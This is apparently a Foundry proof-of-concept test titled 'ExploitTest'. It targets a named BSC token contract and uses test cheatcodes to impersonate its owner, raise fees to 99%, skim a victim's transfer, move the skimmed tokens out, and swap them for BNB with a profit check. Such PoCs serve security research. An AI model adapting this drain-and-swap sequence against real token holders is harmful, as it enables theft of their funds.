pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import {IERC20} from "forge-std/interfaces/IERC20.sol";

interface IUniswapV2Router02 {
    function WETH() external pure returns (address);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

interface ONE1SHIBA {
    function owner() external view returns (address);
    function setTaxFeePercent(uint256) external;
    function setLiquidityFeePercent(uint256) external;
    function transfer(address recipient, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function excludeFromFee(address account) external;
    function setSwapAndLiquifyEnabled(bool _enabled) external;
    function uniswapV2Router() external view returns (address);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────


    address constant TARGET = 0xcc21ec2C6867AC6EFD9cE158996fF47AB5743B2d;
    address attacker = address(this);

    ONE1SHIBA token;
    address owner;
    address victim;
    uint256 victimTokens;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        token = ONE1SHIBA(TARGET);
        vm.label(TARGET, "1SHIBA Token");
        vm.label(attacker, "Attacker");

        // Get the owner address
        owner = token.owner();
        vm.label(owner, "Owner");

        // Deal BNB to attacker for gas
        deal(attacker, 10 ether);

        // Create victim address and give them tokens
        victim = address(0x1337);
        vm.label(victim, "Victim");
        victimTokens = 1000000 * 10**9; // 1M tokens with 9 decimals
        deal(TARGET, victim, victimTokens);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Record initial attacker BNB balance
        uint256 initialBalance = attacker.balance;

        // Get owner address
        owner = token.owner();

        // Step 1: Impersonate owner and set maximum fees, disable auto-swap
        vm.startPrank(owner);
        token.setTaxFeePercent(99);
        token.setLiquidityFeePercent(99);
        token.setSwapAndLiquifyEnabled(false);
        vm.stopPrank();

        // Step 2: Create victim with tokens
        victim = address(0x1337);
        deal(TARGET, victim, 10000000 * 10**9); // 10M tokens

        // Step 3: Victim transfers tokens - 99% fee collected by contract
        vm.startPrank(victim);
        token.transfer(address(0xdead), 5000000 * 10**9);
        vm.stopPrank();

        // Step 4: Check contract token balance (should have ~99% of transfer)
        uint256 contractBalance = token.balanceOf(TARGET);
        console.log("Contract token balance:", contractBalance);

        // Step 5: Owner excludes contract from fees to enable transfer
        vm.startPrank(owner);
        token.excludeFromFee(TARGET);
        vm.stopPrank();

        // Step 6: Transfer accumulated tokens from contract to attacker
        vm.prank(TARGET);
        token.transfer(attacker, contractBalance);

        // Step 7: Attacker swaps tokens for BNB on PancakeSwap
        // Approve router
        IERC20(TARGET).approve(token.uniswapV2Router(), contractBalance);

        // Swap tokens for ETH
        address[] memory path = new address[](2);
        path[0] = TARGET;
        path[1] = IUniswapV2Router02(token.uniswapV2Router()).WETH();

        // Use swapExactTokensForETHSupportingFeeOnTransferTokens
        IUniswapV2Router02(token.uniswapV2Router()).swapExactTokensForETHSupportingFeeOnTransferTokens(
            contractBalance,
            0,
            path,
            attacker,
            block.timestamp + 3600
        );

        // Step 8: Check attacker BNB balance after exploit
        uint256 finalBalance = attacker.balance;
        console.log("Initial BNB balance:", initialBalance);
        console.log("Final BNB balance:", finalBalance);

        // Verify profit
        assertGt(finalBalance, initialBalance, "Attacker should have profited from the exploit");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

